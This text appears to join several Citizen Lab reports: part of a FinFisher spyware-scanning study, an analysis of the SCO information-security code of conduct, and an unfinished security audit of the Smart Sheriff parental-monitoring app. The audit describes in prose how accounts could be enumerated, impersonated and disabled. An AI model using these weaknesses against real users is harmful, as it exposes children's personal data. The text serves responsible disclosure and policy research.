clients.\nConclusion\nIn this report we provided the first update on Citizen Lab’s previous FinFisher scanning work since a widely discussed 2014 hack of FinFisher.  Despite the disclosure of sensitive customer data in that hack,89 and the potential customer concerns this might cause, our latest scans have detected FinFisher servers in more countries than any previous round of scanning.  \nFinFisher is still being used by a number of previously identified government clients, including Ethiopia, which is the defendant in an ongoing lawsuit over previous FinFisher use.90  We have also identified newly identified suspected customers, including: Angola, Egypt, Gabon, Jordan, Kazakhstan, Kenya, Lebanon, Morocco, Oman, Paraguay, Saudi Arabia, Slovenia, Spain, Taiwan, Turkey, and Venezuela.\nWhile we may not be detecting all FinFisher installations, this report’s methods improved on both our ability to detect installations, and to attribute FinFisher servers to specific governmental customers, whom we named. A key goal of this research is to provide a resource to those working on policy and research in this space.  We also believe this kind of reporting is essential to help ensure that citizens have the opportunity to hold their governments accountable. To this end, we identify government users, but redact certain details about live infrastructure (like removing the last octet of IP addresses), whose disclosure might interfere with legitimately sanctioned activities.\nThe Global Intrusion Software Market: Difficult to Study, Tricky to Regulate\nThe market for intrusion software like FinFisher is challenging to track because the key players, from government customers to software developers, have a strong interest in keeping transactions private. However, several years of research, reporting, and revelations have made it clear that a growing list of countries have acquired, or are seeking these tools.\nAs customer lists grow, so should concern over the documented abuse potential of intrusion software. Some governments clearly believe that it can be used, with proper oversight, in the service of legitimate criminal investigations and intelligence gathering. However, there are also well documented cases in which government customers have abused intrusion software to compromise political opponents within their borders, and overseas.\nThe current market seems to bypass some historic limits on the spread of advanced technical intrusion capabilities.  Lack of a strong Science, Technology, Engineering and Mathematics (STEM) education, or absence of long term investment in research and development pipelines, are no longer impediments to obtaining computer exploitation and intrusion capabilities. These tools are now available for purchase by any government. Certainly, lack of development in STEM should not preclude a country from having access to sophisticated investigative tools.  Indeed, an under-resourced state is likely to face security challenges that are just as serious as a more developed one.\nHowever, it can be difficult even for democratic governments with a strong rule of law to oversee secret investigative capabilities like intrusion software.  These tools are likely to be acquired and used by divisions that are professionally discreet in their budgeting and information sharing. The information they generate may also have its origins deliberately disguised before being shared with other departments or agencies.  Intrusion software presents a challenge for accountability in any country, and the oversight authorities in under-resourced countries facing domestic or international security threats may be particularly ill-equipped in expertise and political clout, to identify or act on signs of misuse.\nPrevious research has shown that FinFisher has been used to target regime opponents in several cases.  Notably, FinFisher has been used to hack Ethiopian and Bahraini democracy activists and opposition political figures.  Meanwhile, research and revelations about Hacking Team’s Remote Control System (RCS), a competitor product, have also made it clear that some government customers used these tools to target their political opponents, rather than security threats to their citizens.\nDespite the well documented potential for abuse, the companies who develop and market these capabilities are reluctant and ill-equipped to conduct rigorous due diligence about potential customers, as recent revelations about Hacking Team have made clear.\nThe Wassenaar Arrangement, which regulates the export of weapons, as well as “dual use” technologies, was amended in 2013 to include items related to intrusion software, like FinFisher and Hacking Team’s RCS.  Now, as participants like the European Union have undertaken their own implementations (or are still developing theirs as in the case of the United States), it remains to be seen whether or not this will lead to greater transparency and control, and what impact, if any, it will have on abusive surveillance.\nWe hope that continued evidence-based research of this sort will contribute to greater overall transparency about this market, and provide much-needed points of reference for policy making and tracking the impact of regulatory efforts.\n \nAcknowledgements\nSpecial thanks to Citizen Lab colleagues Morgan Marquis-Boire and Claudio Guarnieri, as well as Ron Deibert and Masashi Crete-Nishihata.

In this example, we include a user agent used by the Tor Browser Bundle. The “nord=1” parameter turns off Google’s SSL redirection.\n13 Yahoo does not return the userLocation object unless a certain type of “User-Agent” header is included. In some cases, we needed to substitute a country-specific version of Yahoo in the GET request (either espanol.yahoo.com or maktoob.yahoo.com).\n14 We verified that the IP of our measurement machine was included in the Libero cookie when visiting the libero.it site directly.\n15 https://github.com/hackedteam/rcs-collector/commit/0a92297ff1cb52112be0a6ee6b8d398cf001ed1e\n16 https://citizenlab.org/2014/02/mapping-hacking-teams-untraceable-spyware/\n17 See our previous fingerprints: https://github.com/citizenlab/spyware-scan/blob/master/ff/fingerprint-2.0.txt, https://github.com/citizenlab/spyware-scan/blob/master/ff/fingerprint-3.0.txt, https://github.com/citizenlab/spyware-scan/blob/master/ff/fingerprint-4.0.txt\n18 We assume that if a FinFisher master is located in a country, then an entity of that country’s government is using the spyware. It is of course possible that government entities may be operating some surveillance from overseas sites. Though, we view this possibility as quite remote, given concerns about relying on foreign (and potentially untrusted) telecom infrastructure to operate surveillance infrastructure.\n19

One starting point for discussion is likely to be the International Code of Conduct for Information Security (the “Code”), which was submitted for consideration to the UN General Assembly in January 2015 by the founding member states of the Shanghai Cooperation Organization (SCO) — China, Russia, Kazakhstan, Kyrgyzstan, Tajikistan, and Uzbekistan (the “SCO states”). According to its sponsors, the Code is intended “to push forward the international debate on international norms on information security, and help forge an early consensus on this issue.”1\nA slightly different version of the Code was originally offered to the UN General Assembly by China, Russia, Tajikistan, and Uzbekistan in September 2011. It was revised for 2015 by purportedly “taking into full consideration the comments and suggestions from all parties.” This time around, however, the international debate has shifted significantly, with renewed efforts to develop international consensus on “information security” informed by both the December 2012 World Conference on International Telecommunications (WCIT) meeting and the June 2013 Snowden disclosures. Accusations that the US and its Five Eyes partners exploit their “dominant position in the information space” have gained credibility, while matters of equitable Internet governance and prevention of cyber attack and intrusion are of the utmost concern to all states. A code of conduct that attempts to address these issues is likely to generate significant interest. \nYet, four years after the first iteration of the Code, the document still raises serious concerns with respect to human rights. The narrative of the Code emphasizes state sovereignty and territoriality in the digital space above all else, and is dominated by intelligence, national security, and regime stability imperatives. Perhaps most worrisome, trends embodied by the SCO and reflected in the Code itself suggest a strategic revisionism on the part of the SCO states towards international human rights law.\nAs efforts to generate consensus around the Code proceed, it is essential to assess its potential long-term outcomes. While the Code effectively captures the sentiment and fears of the international community regarding misuse of the digital space, it ultimately represents a fundamental challenge to the flourishing of global thought and discourse through the Internet, as well as to the established framework of international human rights law.\n \n\nThe interactive feature accompanying this article here illustrates the differences between the 2011 and 2015 versions of the Code. It also allows readers to select particular provisions of the Code to display analysis of the selected language. The feature provides additional detail regarding the issues raised in this article.  \nRoots of the Code in the SCO\nThe Code is largely a product of regional norm-building undertaken within the SCO. Since its establishment in 2001, the SCO has served as a key forum for its member states to explore normative and legal consensus, as well as practical cooperation, regarding non-traditional security threats.2 Initially the SCO focused on those threats embodied by the concept of the “Three Evils”3 — terrorism, separatism, and extremism4 — but the organization soon added information security to its agenda as well. The SCO offers a platform for a “soft launch” of the principles and practices that the SCO governments consider essential to regime stability in the face of these threats. Once these principles and practices have acquired traction regionally, they provide a foundation for building consensus at the international level. \nA “SCO plan of action to ensure international information security” was first agreed upon by heads of state in August 2007.5 Following initiatives laid out in that plan, the SCO states agreed upon a formal convention for information security in June 2009.6 This convention identified main threats in and defined key concepts related to the information space. In June 2011, the states noted their intent to press for a similar agreement — an “international code of conduct” — to address information security in the international arena,7 and the Code was born.  \nRussia’s involvement in this process is particularly noteworthy. As far back as 1999, after its initial introduction in 1998 of the now-yearly UN General Assembly resolution on “Developments in the field of information and telecommunications in the context of international security,”8 Russia submitted to the UN Secretary-General a set of proposed “principles of international information security.”9 In an additional submission Russia identified the “main threats” to that security.10 This early emphasis on information security appears to relate to the work of Vladislav Sherstyuk, a former KGB officer and a general within FAPSI11 (Russia’s electronic intelligence agency) during the 1990s.12 The generals of FAPSI essentially defined the country’s approach to information security. Sherstyuk was appointed director of FAPSI in 1998, and in 1999 he became chief of the committee on information security of the Russian Security Council.13 Sherstyuk was responsible for developing Russian policy in this area, including the drafting of the Doctrine of Information Security14 that was ultimately approved by the Russian President in 2000.15\nWhile these information security principles did not advance at the international level at such an early stage, within the regional framework of the SCO they flourished and solidified, strengthened by the interest and participation of China. The concepts and threats identified by Russia — including “use of information to undermine the political, economic and social system of other States,” “domination or control in the information area,” and “unauthorized transboundary influence through information”16 — are clearly integrated within the SCO Agreement on Cooperation in the Field of International Information Security. They have now reappeared, refined, in the form of the Code. \nThis history is significant in light of the serious human rights challenges associated with the SCO and its member states. The SCO framework is built upon normative agreements that present a regional alternative to established principles of international human rights law, as well as practices to confront non-traditional security threats that infringe upon human rights.17 They recognize that information security includes control of content and exchange through digital media. The Code affirms and extends those principles and practices. (See interactive analysis.) \nWhat’s new for 2015?\nA number of developments affecting the digital space have taken place since 2011 which have influenced the Code and international diplomacy. Most prominent among these are the Snowden disclosures and their ongoing fallout. Other important developments include heated debates over the future of Internet governance, public reporting of major digital security breaches within the private sector and government, and bilateral (e.g., US-China) and multilateral (e.g., UN Group of Governmental Experts) grappling with the issue of digital attacks and appropriate state responses. Leadership changes in Russia and China have also influenced the digital environment, with Vladimir Putin returning to power in 2012 and Xi Jinping assuming the presidency in 2013. Both leaders have overseen major domestic crackdowns with heavy emphasis on information controls.\nThe Code reflects these changes in its bolder stance on, and more urgent call for, international consensus on digital norms. Major themes represented in the revised Code are:\nAppreciation for the UN Group of Governmental Experts on Developments in the Field of Information and Telecommunications in the Context of International Security (GGE)\nWhile the GGE existed prior to the issuance of the Code in 2011, it was not mentioned in the original document. The 2015 version of the Code, in contrast, makes substantial reference to the GGE’s work, indicating a favorable view by the SCO states of the work undertaken over the past four years in that forum. This appreciation for the GGE is likely the result of its treatment of issues of critical importance to the SCO states, namely, recognition of sovereignty and territoriality in the digital space, and recommendation of voluntary, non-binding norms of state behaviour and confidence-building measures to prevent conflict between states. As a body comprised of expert state representatives and reflecting “equitable geographic distribution,” it offers substantial authority for norm development on these issues. The Code recognizes this fact in its reference to paragraph 16 of the GGE report, which concerns continuation of the norm-building process. (See interactive analysis.)\nDigging in on Internet governance and “dominance” in the digital space\nThe 2015 version of the Code makes stronger reference to Internet governance and equal rights of states in matters of digital policy, drawing on World Summit on the Information Society (WSIS) outcomes for support. It also resurfaces the contentious issues raised during the 2012 WCIT meeting in Dubai.18 (See interactive analysis.) Both versions of the Code endorsed the view that “policy authority for Internet-related public issues is the sovereign right of States,” but the 2015 version goes further, noting that that “states must play the same role in, and carry equal responsibility for, international governance of the Internet, its security, continuity and stability of operation, and its development.” \nThe principle of Internet policy authority as the sovereign right of states has been hotly debated, particularly at WCIT 2012. The U.S. and other states have argued that Internet policy should not be exclusively state-determined (e.g., in fora such as the International Telecommunication Union); rather, it should rely upon a multistakeholder model of Internet governance.19 Russia, China, and many developing countries have taken the view that such a position naturally favors the West, which already holds significant influence over the Internet given the role of ICANN and major US-based ICT companies. Andrey V. Krutskikh, the Russian government’s representative at WCIT 2012, stated after the event: \nDealing with ICTs without including the Internet is absurd. It is mandatory to consider these two phenomena together . . . . [T]he system should be made operational, instead of trying to freeze the current situation and claim that the system is working – we should acknowledge that it is not working well. And the discussion that took place in Dubai was focused exactly on this – that the system is not working well. . . . [W]e should coin a new system together. . . . And everybody – Chinese, Americans, NATO-allies — should engage in the process [as opposed to just] attempting to preserve their present advantages.20\nThe issue of participation in Internet governance is closely linked to that of “dominance” in the digital space, an SCO concept of Russian origin that is also highlighted in the Code. The Code flags inequalities and dominant-state advantages in the information space, including with respect to control of ICT supply chains, as serious threats to national security. This position has achieved wider resonance in the international community following the Snowden disclosures, and could generate greater interest in the Code despite its significant rights implications. \nInternational human rights law revisionism\nThe evolution of the Code’s sole substantive provision regarding human rights — paragraph 2(f) in the 2011 version and 2(7) in the 2015 version — is instructive concerning the strategic outlook of the SCO states on international human rights law. The 2011 version discussed digital rights by suggesting they could be curtailed to “comply[] with relevant national laws and regulations” — an easy target for criticism given the pervasive rights abuses tolerated, if not authorized or required, by the SCO states’ legal and regulatory regimes. The 2015 version replaces the reference to national standards with reference to international law, namely, the International Covenant on Civil and Political Rights (ICCPR), thereby removing specific language that might have dissuaded states concerned with digital rights from accepting the Code. \nIn elaborating on the application of international human rights law, however, the Code focuses primarily on restrictions on freedom of expression available to states under the law, quoting ICCPR article 19(3). This selective invocation of the law suggests the SCO states’ intention to frame existing domestic information controls as compatible with international human rights law. Such an interpretation, however, is not consistent with objective application of the law. The UN Human Rights Committee has noted that general reservations to the rights guaranteed in ICCPR article 19(2) are incompatible with the object and purpose of the treaty,21 and that restrictions imposed on the basis of article 19(3) “may not put in jeopardy the right itself. . . . [T]he relation between right and restriction and between norm and exception must not be reversed.”22 Moreover, restrictions pursuant to article 19(3) “must conform to the strict tests of necessity and proportionality.”23 Pervasive information controls in the SCO states, which restrict dissemination of content deemed politically sensitive by the government and in some instances result in criminal punishment of legitimate expression, do not credibly meet these standards.  \nAdditionally, the lack of reference to the right to privacy is noteworthy. Privacy has been high on the agenda of the UN since the Snowden disclosures, and was highlighted in the very same General Assembly resolution drawn on in the Code for the proposition that “the rights of an individual in the offline environment must also be protected in the online environment.”24 Indeed, the UN Human Rights Council has now established a special procedure specifically devoted to the right to privacy.25 The failure to mention this right suggests an unwillingness by the SCO states to concretely address state surveillance. \nTo what end?\nThe purpose of the SCO states in advancing the Code is ultimately the key issue for consideration. Indeed, the progress made in the GGE on issues of practical and even military significance — recognized in the Code itself — raises the question: what additional benefits do the SCO states hope to obtain by resuscitating the Code at the wider UN level?\nOn one hand, as others have written, the Code has allowed the SCO states to obtain a sort of “diplomatic high ground” regarding digital norms, staking a claim on normative principles emerging at the international level by drawing upon those already well-developed within the SCO.26 China, for example, has frequently referenced the Code when responding to allegations regarding its activity in the digital space, including involvement in digital espionage or attack.27 China has invoked the Code as though it were prima facie evidence of the good faith and positive contributions of the Chinese government when it comes to cyberspace — a standard to which other states should aspire.  \nHowever, the Code appears intended to achieve more than a declaratory effect. It is one element of the SCO states’ bifurcated approach to international diplomacy on information security. The SCO states have utilized the GGE and bilateral negotiations to achieve concrete results regarding state-to-state interaction and confrontation or hostilities in the digital space. At the same time, they have actively engaged the UN General Assembly, its First Committee, and other multilateral fora to generate international acceptance of norms conducive to domestic policy on digital rights. These norms concern the sensitive systemic issues of what constitutes appropriate policy for citizens’ digital participation, who holds that policy authority, and how to resolve such policy with international law and current realities of ICT usage. \nRussia and China in particular are vocal proponents of “digital” or “Internet” sovereignty, treating the digital space as territory disputed between states and properly subject to domestic control.28 Russian lawmakers have described the Internet as “break[ing] down borders and undermin[ing] the idea of sovereignty,” with the ability to “encroach on internal sovereign interests and destroy national security.”29 China, meanwhile, has stated:\nThe sovereignty principle in cyber space includes at least the following factors: states own jurisdiction over the ICT infrastructure and activities within their territories; national governments are entitled to making public policies for the Internet based on their national conditions; no country shall use the Internet to interfere in other countries’ internal affairs or undermine other countries’ interests.30\nThis position is in line with China’s assertion of unique requirements presented by its “history, culture and social system” (as flagged in the Code), and its pushback against purportedly Western-dominated “universal values,” which President Xi has identified as contrary to Communist Party ideology.31\nImportantly, the Code offers a chance to redefine application of international human rights law in order to extend SCO notions of sovereignty and territorial integrity to the digital space. SCO state practice and normative agreements underscore these states’ baseline principle that a state may circumscribe, surveil, or otherwise control any content or digital medium utilized within its territory at its discretion. Such control is deemed essential for maintenance of domestic stability and regime preservation in light of the proximity and influence afforded to individuals, states, and other actors by the Internet.32 Yet, it is also in direct contradiction with established principles of international human rights law, contravening rights including privacy and freedoms of opinion and expression, as well as undermining the agency of domestic populations.\nThe Code may be viewed as an attempt to square these diametrically opposed principles, to build consensus within the international community around a revised interpretation and application of international human rights law to favor the SCO states’ domestic agendas. It is noteworthy that the Chinese government, which presented both versions of the Code to the UN, has already attempted in other contexts to bolster its legitimacy on contested issues by relying on the purported existence of “consensus,” as embodied in codes of conduct or similar agreements.33 For example, the government has engaged in massive crackdowns on rights defense lawyers in recent years.34 Alongside these crackdowns, China’s largest bar association, the government-controlled All China Lawyers Association, has revised its “code of conduct” for lawyers, reflecting new nationwide standards of practice that would effectively censure the sensitive work of rights defense lawyers.35\nWhile the SCO states have accepted the premise that “rights of an individual in the offline environment must also be protected in the online environment,” if those rights are only those recognized in existing domestic policy and practice, rather than international law, serious challenges remain. Attempts to frame the Code as “consensus,” relying on either the support or the silence of the international community, may erode protections for human rights guaranteed under international law. If the international community disagrees with this proposition, it will need to critically engage the Code and explicitly question its international human rights law ramifications. \nAcknowledgements\nSpecial thanks to Irina Borogan of Agentura.ru for her expert input and sharing of interview material regarding the evolution of information security in Russia.

Krutskikh, special coordinator on issues related to the political usage of ICTs in the Russian Ministry of Foreign Affairs — comparing US dominance over the Internet to its historical monopoly on the atomic bomb — flagged the importance to governments of “restor[ing] the balance in the system and ensur[ing] their own survival.” He also spoke of the need to prevent domestic acceptance of “harmful” influence “impose[d] through the Internet.” Andrey V. Krutskikh, supra n. 20.\n33 In an interesting corollary, China has leveraged the existence of a “declaration of conduct” and related bilateral consultations in an attempt to preclude jurisdiction of an international arbitral tribunal in a case regarding the South China Sea. In the case of The Republic of the Philippines v. The People’s Republic of China (see http://www.pca-cpa.org/showpage65f2.html?pag_id=1529), China asserted (through a position paper) that the Permanent Court of Arbitration in the Hague has no jurisdiction, relying in part on a “mutual understanding” of the process for dispute resolution alleged to have been established between China and the Philippines on the basis of bilateral statements and the “Declaration on the Conduct of Parties in the South China Sea.” See Ministry of Foreign Affairs of the People’s Republic of China, “Position Paper of the Government of the People’s Republic of China on the Matter of Jurisdiction in the South China Sea Arbitration Initiated by the Republic of the Philippines,” December 7, 2014, http://www.fmprc.gov.cn/mfa_eng/zxxx_662805/t1217147.shtml. According to China, “The relevant provisions in the aforementioned bilateral instruments and the DOC are mutually reinforcing and form an agreement between China and the Philippines. On that basis, they have undertaken a mutual obligation to settle their relevant disputes through negotiations.” Ibid. at para. 39. The government has accused the Philippines of “violat[ing] consensus.” See “China opposes Philippines arbitration case,” CCTV.com, July 7, 2015, http://english.cntv.cn/2015/07/07/VIDE1436267888563988.shtml. One commentator has reflected: “While Manila sees its case as a test for international law, China dismisses it as a blatant grab for territory.” See Shannon Tiezzi, “In the Philippines’ South China Sea Case, Is International Law on Trial?,” The Diplomat, July 14, 2015, http://thediplomat.com/2015/07/in-the-philippines-south-china-sea-case-is-international-law-on-trial/. A similar calculus appears to apply to China’s handling of disputes in the digital space.\n34 See Committee to Support Chinese Lawyers, Plight and Prospects: The Landscape for Cause Lawyers in China, September 2015, http://leitnercenter.org/files/Plight%20and%20Prospects_FULL%20FOR%20WEB.pdf; Committee to Support Chinese Lawyers, Legal Advocacy and the 2011 Crackdown in China, November 2011, http://www.csclawyers.org/letters/Legal%20Advocacy%20and%20the%202011%20Crackdown%20in%20China.pdf.\n35 Such provisions include duties of “loyalty to the Party” and to “speak and act cautiously,” including requirements to “not call for, or unite others, to create a surge of public opinion and pressure on a case one is handling, or organize or participate in online gatherings, observations support or other inappropriate ways of using the Internet or other media, influencing judicial organs handling of a case.” See China Law Translate, “ACLA Explanation of Reforms to the Lawyers Code Of Conduct,” June 22, 2014, http://chinalawtranslate.com/acla-explanation-of-reforms-to-the-lawyers-code-of-conduct/?lang=en.\n\n\t\t\t\t\n\t\t\t",

    "text": "\n\t\t\t\tAuthors: Collin Anderson (Independent Researcher), Masashi Crete-Nishihata (Citizen Lab), Chris Dehghanpoor (Lookout Inc.), Ron Deibert (Citizen Lab), Sarah McKune (Citizen Lab), Davi Ottenheimer (flyingpenguin), and John Scott-Railton (Citizen Lab)\nMedia Coverage: The Associated Press, The New York Times, BBC News, PC Mag, Global News, Engadget, Slashdot, Tech Times, Techdirt, Threatpost, Houston Chronicle, Toronto Star, CBC News, SFGate, The Christian Science Monitor, The China Post, The Japan Times, Yonhap News, Hankook Ilbo.\nRead the press release.\n한국어 요약본은 여기서 보실 수 있습니다.\nDownload PDF version.\nIntroduction\nWhile South Korea is one of the most highly connected societies in Asia, its government has established an aggressive regulatory regime to control digital content deemed illegal, a national security threat, or harmful to minors.\nIn April 2015, a mandate came into effect requiring South Korean telecommunications operators to provide the means to block harmful content on minors’ mobile phones. The mandate, introduced by South Korea’s telecommunications regulatory body, the Korean Communications Commission (KCC), also requires that a minor’s parent be notified if the content filtering is disabled. While the possibility of limiting or monitoring minors’ mobile phone communications is encouraged in some jurisdictions, and many commercial products are available, South Korea has gone the furthest among all countries by mandating the installation of digital content blocking applications for minors.\nWell before the April 2015 mandate, the Korean Mobile Internet Business Association (MOIBA), an influential consortium of mobile telecommunications providers and phone manufacturers, released the Smart Sheriff parental-monitoring application. Smart Sheriff was developed and promoted with the support of the KCC, including funding totaling KRW 3.18 billion (approximately USD $2.7 million) for a project made up of Smart Sheriff and an additional messaging-monitoring application called S-Dream.1 Smart Sheriff allows parents to remotely block content and monitor and administer applications that a child is able to access on their mobile device, as well as schedule the times of day that the phone can be used.\nSmart Sheriff is one of several applications that may fulfill the April 2015 regulatory requirements. Compared to other Korean-language parental-monitoring applications, it is widely used (between 100 and 500 thousand users), and has received substantial publicity from the KCC.2 Smart Sheriff is an important case for understanding the risks and implications of requiring digital-monitoring services for minors.\nThis report describes the results of two independent security audits of Smart Sheriff, one by researchers who collaborated at the 2015 Citizen Lab Summer Institute (held at the Munk School of Global Affairs, University of Toronto), and the other by the auditing firm Cure53.3\nThe combined audits identified twenty-six security vulnerabilities in recent versions of Smart Sheriff (versions 1.7.5 and under). These vulnerabilities could be leveraged by a malicious actor to take control of nearly all Smart Sheriff accounts and disrupt service operations. Each vulnerability is fully described in the technical appendix (appendix A) and the wider implications of these findings are discussed in the legal and policy appendix (appendix B).\nTechnical Findings\nThe audits identified the following critical security flaws:\n\nPersonally Identifiable Information (PII) and account credentials are not stored, processed, or transmitted securely so they are vulnerable to interception.\nMalicious code can be injected into the application, allowing third parties to perform unauthorized activities.\nDesign failures allow parent-set limits to be easily circumvented or disabled.\nAccounts can be registered and managed without proper validation or passwords, which could lead to denial of service or compromise of accounts.\nWhile website filtering functionality has been supposedly disabled since May 2015, Smart Sheriff still insecurely transmits Web browsing activity to MOIBA which makes the content vulnerable to interception.\nSmart Sheriff’s infrastructure is not properly maintained or protected against malicious activity, including brute force attempts and erroneous requests, which could lead to compromise of the service.\n\nLegal and Policy Implications\n\nSmart Sheriff’s limited security features fall substantially short of data protection and information security requirements under Korean law.\nSmart Sheriff’s insecure design runs counter to the representations made by MOIBA in Smart Sheriff’s terms of service and privacy policy.\nSmart Sheriff’s functionality impinges upon its users’ privacy rights while exceeding the actual requirements of the April 2015 mandate.\nTaken together, these problems raise concerns under international human rights law.\n\nResponsible Disclosure\nOn 3 August 2015, Citizen Lab notified MOIBA of the issues identified in the two security audits. Following established standards for vulnerability disclosure, we set a publication deadline for a minimum of 45 days after our initial disclosure of vulnerabilities to the vendor.4\nOn 5 August a MOIBA representative replied and provided an initial timeline for addressing fifteen of the vulnerabilities. On 6 August MOIBA released an updated version of the application (v1.7.6) that supported HTTPS.5 An additional update (v1.7.7) released on 25 August claimed to address additional vulnerabilities.6\nAccording to the most recent timeline provided to the Citizen Lab by MOIBA on 20 September 2015, patches should be in place for twenty of the issues identified, with sixteen published. Two further patches are scheduled shortly after the publication of this report. However, we have not fully verified whether all patches have been implemented, and MOIBA has not fully apprised us of the manner in which the vulnerabilities were addressed. We urge caution against further public use and promotion of the application until an independent and thorough audit of Smart Sheriff can be conducted.\nOn 4 September MOIBA was notified of this report’s intended publication date and was sent a copy for review to ensure that no personally identifying information was inadvertently disclosed. As of the date of publication, we have not received any further correspondence from MOIBA.\nSmart Sheriff Overview\nSmart Sheriff allows parents to remotely monitor and administer applications on their children’s phones, and to schedule the times of day that the phone can be used. It was officially launched for Android in June 2012. An iOS version was created soon after but it has not been updated since 2013 and reportedly has limited usability.\nRegistration\nOnce installed, Smart Sheriff requires the following information:\n\nphone numbers for parent and child\nthe child’s gender and date of birth\nthe child’s name\nPIN code for the administration of the account.\n\nAfter registration, Smart Sheriff routinely transmits usage and configuration information from the phone to the back-end server, including:\n\nmanufacturer, model, and operating system version of the device\napplications installed on the phone and their amount of usage\nwebsites visited.\n\nFunctionality\nParents can control applications and schedule usage restrictions in two ways: with the application itself or through a website hosted by MOIBA. Both require the parent’s phone number and the PIN code set during registration. On both interfaces, the parent can review the information collected from the child’s device and control what applications are accessible.\nFor the minors, interaction with the application is limited to warning messages that are triggered when they attempt to use prohibited applications or use the phone during restricted times. It appears that the only authorized way to remove the app is through the Web interface.\nDescriptions of Smart Sheriff in app stores claim it can filter websites that minors can access.7 However, these functions have apparently been disabled since 18 May 2015. MOIBA indicated that the reason for disabling this functionality was concern over infringement of children’s privacy.8\n\n\n\n\n\n\n\nApplication Interface\nWeb Interface\n\n\n\nSecurity Audit Results\nWe identified twenty-six vulnerabilities and design issues that could lead to the compromise of user accounts, disclosure of information, and corruption of infrastructure. The same issues were often present in multiple parts of the application and infrastructure. For example, we identified a potential attack against user accounts via the Smart Sheriff mobile application, then determined that it could also be made against the Web-based parental administration site. These multiple flaws suggest that the application was not fully examined for security issues before being released. Both audits were done in a limited window of time and without access to the original source code.\nMany of the vulnerabilities we identified were compounded by a lack of proper protections for accounts and on Smart Sheriff’s back-end services, creating systemic, compounding failures with significant implications for users. For example, Smart Sheriff relies on a user’s phone number for authentication. However, phone numbers are predictable and a poor substitute for a private code.\nTaken together, the flaws that we identified could be exploited by a malicious actor to take control of nearly all Smart Sheriff accounts and disrupt the service’s entire operations. For example, a minor child could easily disable their own copy of the application. However, of greater concern, an attacker could also trigger the uninstallation of a copy of Smart Sheriff from nearly every device without users’ permission.\nWe provide high-level overviews of the security issues we identified across three broad categories: (1) failure to properly encrypt data, (2) lack of effective access controls, and (3) lack of infrastructure security.9\nFailure to Properly Encrypt Data\nSensitive User Data Is Not Encrypted\nSmart Sheriff fails to adequately encrypt and protect user data and Personally Identifiable Information (PII), either in storage or in transit. The ways that Smart Sheriff handles PII fall below widely accepted best practices as well as standards set out by Korean law.10 Our audit found that authentication, registration, and communications with Smart Sheriff’s servers are all unencrypted. As a result, names of minors and parents, dates of birth, mobile device information, gender, and telephone numbers are all visible to anyone controlling the network that the device uses. An attacker could capture the data and use them to impersonate Smart Sheriff’s server, and issue commands that Smart Sheriff apps would treat as genuine.11\nDisclosure of User Traffic Records in Plaintext\nSmart Sheriff has the ability to monitor and filter access to Web content, although use of this functionality is not currently available for parents. Despite this feature not being operational, the application still sends records of all Web traffic from the child’s device to the Smart Sheriff service.\nSmart Sheriff establishes a monitoring service on Android to read the browser history as it is recorded and matches requests for websites against a block list. For every page accessed, a request is made to the Smart Sheriff API containing the requested domain, page, and URL parameters, regardless of whether this Web request was performed to an unencrypted (HTTP) or encrypted (HTTPS) website.\nIn response to this information, a score is returned for each site that determines whether the website should be filtered. If the site matches the block list the user is forwarded a block page. During this communication Smart Sheriff circumvents part of the protective features of HTTPS, thus undermining the security of third-party websites visited by the user by simultaneously exposing the traffic to the network and sending a complete browsing record to MOIBA.12\nAuthentication Not Properly Encrypted and Vulnerable to Attack\nAlthough Smart Sheriff attempts to obfuscate the unique device identifier and parental passcode that are used to authenticate the application to Smart Sheriff’s server, the approach used is weak and provides minimal security. The identifier, which is either the phone number or the device’s hardware identifier, is obfuscated using an insecure method that is contrary to standard practice.13\nKeys and obfuscation can be reverse-engineered (or extracted from the decompiled app), allowing an attacker to decrypt any of the protected data or target specific users. Even if the key is not known to an attacker, Smart Sheriff’s obfuscation can be fully bypassed through simple and well-known attacks, granting an attacker access to sensitive information.\nNo Additional Data Storage Protections\nSmart Sheriff does not encrypt locally stored user data and instead relies solely on the application data segregation within the Android operating system to provide moderate security assurances. Smart Sheriff does not implement any form of cryptographic protection on its internal storage.14 Moreover, the application and MOIBA infrastructure do not check for malformed or malicious requests that could compromise the application’s integrity. In the course of auditing the application, we were able to collect information on the database schema and back-end services of MOIBA. The ability to retrieve this information calls into question the level of protection afforded to remotely stored data and indicates that there is no encryption for personally identifiable information.\nMOIBA Infrastructure Has Inadequate SSL Security\nWhile Smart Sheriff itself did not use transport encryption, MOIBA infrastructure supports secure transmission of traffic through TLS/SSL.15 However, their servers fail to meet common security standards. The deployment is based on obsolete and insecure protocols that are vulnerable to attacks that could lead to the interception and impersonation of MOIBA’s servers. According to SSL Labs’ widely used metric, Smart Sheriff’s deployment of SSL receives an “F” grade.16 The transport encryption offered is clearly inadequate.17\nAfter our disclosure, MOIBA released an update to Smart Sheriff (v1.7.6) that includes communication over HTTPS. However this version does not properly validate the credentials received and appears to accept a self-signed certificate, which minimizes the update’s effectiveness.\nLack of Effective Access Controls\nThe primary mechanism for authentication across the Smart Sheriff service is a device identifier that is derived using reversible obfuscation rather than industry-standard encryption. If an attacker is able to guess, enumerate, or intercept the device identifier of a phone with Smart Sheriff installed, the attacker can impersonate the application and undertake a range of attacks.18\nFor example, using only the device identifier, an attacker can impersonate a user and request the parents’ phone number, children’s names, and their dates of birth. Moreover, an attacker can use the Smart Sheriff API to request a parent’s administration code (itself an insecure four-character string) and use it to take control of the account.\nInconsistent and Insufficient Authentication\nNeither the Smart Sheriff Web-based parental administration interface nor its API consistently check that requests for sensitive information are valid. The result is a wide range of potential attacks. An attacker who knows only the phone number of a target can request the name, age, and usage statistics of a user via the API.19 Similarly, an attacker can falsify reports that a particular user has violated parental controls.\nIn some cases, Smart Sheriff servers blindly accept queries that it believes are sent by the browser without checking whether the requester owns the account, or if the user whose data are being accessed is even logged in via the Web interface. This vulnerability enables an attacker who possesses a Smart Sheriff user’s phone number to retrieve sensitive information, modify accounts, and even disable devices. An unauthenticated attacker can even create a new account, whether or not an original account already exists, creating a further vector of compromise.20\nWhile our audit examined only a limited number of queries, it is clear that an attacker who has enumerated users’ phone numbers could potentially change the PINs of parental accounts, remotely disable devices, and even disclose personal information for all Smart Sheriff users.\nLack of Infrastructure Security\nHigh-Volume Queries Not Restricted\nWe attempted to identify local phone numbers registered with Smart Sheriff to measure the applications’ popularity. This test involved queries that made thousands of requests to MOIBA within a short period of time. At no point were these queries restricted, which means that brute-force attempts on passwords and numbers would be feasible against the application, even if protections for account access were put into place.21\nUnpatched and Outdated\nThe software providing the Smart Sheriff back-end services is out of date, and contains known vulnerabilities. Most of the software observed on the remote server is at least two years old. These outdated and depreciated services make it highly likely that the Smart Sheriff infrastructure will experience 